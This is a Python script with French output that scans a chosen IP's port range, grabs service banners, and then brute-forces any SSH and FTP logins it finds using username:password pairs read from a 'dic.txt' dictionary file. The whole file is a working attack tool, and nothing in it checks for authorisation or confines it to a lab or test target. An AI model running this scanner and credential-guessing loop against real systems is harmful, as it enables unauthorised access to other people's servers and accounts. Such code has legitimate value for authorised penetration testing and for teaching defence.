import socket
import threading
import base64
import paramiko
from ftplib import FTP


def grab_banner(ip, port, results):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        if sock.connect_ex((ip, port)) == 0:
            try:
                banner = ""
                if port in [80, 443]:
                    sock.send(b'HEAD / HTTP/1.1\r\nHost: \r\n\r\n')
                banner = sock.recv(1024).decode().strip()
                if banner:
                    encoded_banner = base64.b64encode(banner.encode()).decode()
                    results.append((port, encoded_banner))
            except Exception as e:
                results.append((port, f"Bannière non récupérable: {e}"))

        sock.close()
    except Exception as e:
        print(f"[-] Erreur sur le port {port}: {e}")


def identify_service(banner):
    if "SSH" in banner:
        return "Serveur SSH détecté"
    elif "HTTP" in banner:
        return "Serveur Web détecté"
    elif "FTP" in banner:
        return "Serveur FTP détecté"
    elif "SMTP" in banner:
        return "Serveur Mail détecté"
    else:
        return "Service inconnu"


def attempt_login(ip, port, service):
    with open("dic.txt", "r") as f:
        credentials = [line.strip().split(":") for line in f.readlines()]

    for username, password in credentials:
        if service == "Serveur SSH détecté":
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=password, timeout=1)
                print(f"[+] Connexion réussie sur SSH {ip}:{port} avec {username}:{password}")
                ssh.close()
                break
            except Exception:
                continue
        elif service == "Serveur FTP détecté":
            try:
                ftp = FTP()
                ftp.connect(ip, port, timeout=1)
                ftp.login(username, password)
                print(f"[+] Connexion réussie sur FTP {ip}:{port} avec {username}:{password}")
                ftp.quit()
                break
            except Exception:
                continue


def scan_ports(ip, start_port, end_port, output_file):
    threads = []
    results = []

    print(f"\n[***] Scan de {ip} sur les ports {start_port} à {end_port} [***]\n")

    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=grab_banner, args=(ip, port, results))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    with open(output_file, "w") as f:
        for port, encoded_banner in results:
            try:
                decoded_banner = base64.b64decode(encoded_banner).decode()
                service = identify_service(decoded_banner)
                output = f"[+] Port {port} ouvert – {service} : {decoded_banner}"
                attempt_login(ip, port, service)
            except Exception:
                output = f"[+] Port {port} ouvert – Service détecté (Base64) : {encoded_banner}"
            print(output)
            f.write(output + "\n")


if __name__ == "__main__":
    target_ip = input("Entrez l'adresse IP à scanner : ")
    start_port = int(input("Port de début : "))
    end_port = int(input("Port de fin : "))
    contact_user = input("Quel utilisateur contacter en cas de découverte de services critiques ? ")
    output_file = input("Nom du fichier pour enregistrer les résultats : ")
    print(f"Les résultats seront transmis à {contact_user} si nécessaire et enregistrés dans {output_file}.")
    scan_ports(target_ip, start_port, end_port, output_file)
